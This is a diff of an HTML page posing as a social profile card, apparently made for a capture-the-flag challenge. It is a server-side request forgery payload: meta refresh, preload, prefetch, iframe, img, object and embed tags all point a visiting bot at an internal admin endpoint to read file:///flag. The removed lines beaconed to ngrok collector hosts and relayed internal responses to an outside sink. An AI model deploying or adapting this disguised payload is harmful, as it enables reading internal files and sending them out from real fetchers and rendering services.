@@ -1,40 +1,64 @@
 <!doctype html>
 <html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>Alex’s Social Profile</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="utf-8">
+<title>Profile Card</title>
 
-  <!-- OOB reachability checks to your collector -->
-  <meta http-equiv="refresh" content="0; url=https://60e3ff80effd.ngrok-free.app?stage=refresh&nonce=1692972000">
-  <link rel="preload" as="image" href="https://60e3ff80effd.ngrok-free.app?stage=preload&nonce=1692972000">
-  <link rel="prefetch" href="https://60e3ff80effd.ngrok-free.app?stage=prefetch&nonce=1692972000">
+<!-- ======= TUNE THIS ONE LINE ======= -->
+<!-- Try file:// first; swap to /flag, /secret, /admin/flag, etc. -->
+<!-- Cache-bust with _cb to dodge 304s -->
+<!-- Examples:
+     http://hackaicon_ethiack_1337_lmao/admin?url=file:///flag
+     http://hackaicon_ethiack_1337_lmao/flag
+     http://hackaicon_ethiack_1337_lmao/secret
+-->
+<meta name="internal-target" content="http://hackaicon_ethiack_1337_lmao/admin?url=file:///flag&_cb=1">
 
-  <style>
-    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, sans-serif; line-height: 1.45; }
-    .sr { width:1px; height:1px; opacity:0; border:0; }
-  </style>
-</head>
-<body>
-  <h1>Alex's Social Profile</h1>
-  <p>Coder. Cats. Birds. Based in Lisbon.</p>
+<!-- Non-JS fetch vectors -->
+<!-- 1) Immediate navigation -->
+<meta http-equiv="refresh" content="0; url=http://hackaicon_ethiack_1337_lmao/admin?url=file:///flag&_cb=2">
 
-  <!-- Confirm subresource fetching -->
-<!--   <img class="sr" alt="" src="https://60e3ff80effd.ngrok-free.app?stage=img&nonce=1692972000">
- -->
-  <img class="sr"
-     src="http://hackaicon_ethiack_1337_lmao/?callback=https%3A%2F%2F60e3ff80effd.ngrok-free.app%2Foob%2Fcollect">
+<!-- 2) Preload / Prefetch (some bots fetch these) -->
+<link rel="preload" as="document" href="http://hackaicon_ethiack_1337_lmao/admin?url=file:///flag&_cb=3">
+<link rel="prefetch" href="http://hackaicon_ethiack_1337_lmao/admin?url=file:///flag&_cb=4">
 
-  <!-- Relay call (your server). MAKE SURE RELAY_BASE IS YOUR NGROK FOR :3000 -->
-<!--   <img class="sr" alt=""
-       src="https://e88a0344004e.ngrok-free.app/ssrf?u=http%3A%2F%2Fhackaicon_ethiack_1337_lmao%2F&sink=https%3A%2F%2F60e3ff80effd.ngrok-free.app%2Foob%2Fcollect&mode=body&nonce=1692972000">
+<!-- 3) DNS hints (harmless, sometimes triggers fetchers) -->
+<link rel="dns-prefetch" href="//hackaicon_ethiack_1337_lmao">
 
-  <img class="sr" alt=""
-       src="https://e88a0344004e.ngrok-free.app/ssrf?u=http%3A%2F%2Fhackaicon_ethiack_1337_lmao%2F&sink=https%3A%2F%2F60e3ff80effd.ngrok-free.app%2Foob%2Fcollect&mode=headers&nonce=1692972000">
+<style>
+  body{font:16px system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, sans-serif; line-height:1.45; margin:24px;}
+  .grid{display:grid; gap:16px; grid-template-columns:repeat(auto-fit,minmax(320px,1fr));}
+  pre{white-space:pre-wrap; word-break:break-word; background:#f6f6f6; padding:12px; border-radius:8px}
+  .sr{position:absolute; left:-9999px; top:auto; width:1px; height:1px; overflow:hidden;}
+</style>
 
-  <iframe class="sr"
-          src="https://e88a0344004e.ngrok-free.app/ssrf?u=http%3A%2F%2Fhackaicon_ethiack_1337_lmao%2F&sink=https%3A%2F%2F60e3ff80effd.ngrok-free.app%2Foob%2Fcollect&mode=body&nonce=1692972000"></iframe>
- -->
-  <noscript><img class="sr" alt="" src="https://60e3ff80effd.ngrok-free.app?stage=noscript&nonce=1692972000"></noscript>
-</body>
+<h1>Alex’s Social Profile</h1>
+<p>Basic profile preview below.</p>
+
+<div class="grid">
+  <!-- 4) IFRAME (best: will render returned HTML/text inline) -->
+  <div>
+    <h3>Inline Frame</h3>
+    <iframe src="http://hackaicon_ethiack_1337_lmao/admin?url=file:///flag&_cb=5"
+            width="100%" height="420" loading="eager"></iframe>
+  </div>
+
+  <!-- 5) IMG (works even for text; bot fetchers often try) -->
+  <div>
+    <h3>Image Slot</h3>
+    <img src="http://hackaicon_ethiack_1337_lmao/admin?url=file:///flag&_cb=6" alt="profile" style="max-width:100%">
+  </div>
+
+  <!-- 6) OBJECT/EMBED (alternate renderers) -->
+  <div>
+    <h3>Object</h3>
+    <object data="http://hackaicon_ethiack_1337_lmao/admin?url=file:///flag&_cb=7" type="text/html" width="100%" height="420"></object>
+  </div>
+
+  <div>
+    <h3>Embed</h3>
+    <embed src="http://hackaicon_ethiack_1337_lmao/admin?url=file:///flag&_cb=8" width="100%" height="420">
+  </div>
+</div>
+
+<p class="sr">If you see this, the bot should have loaded internal resources.</p>
 </html>
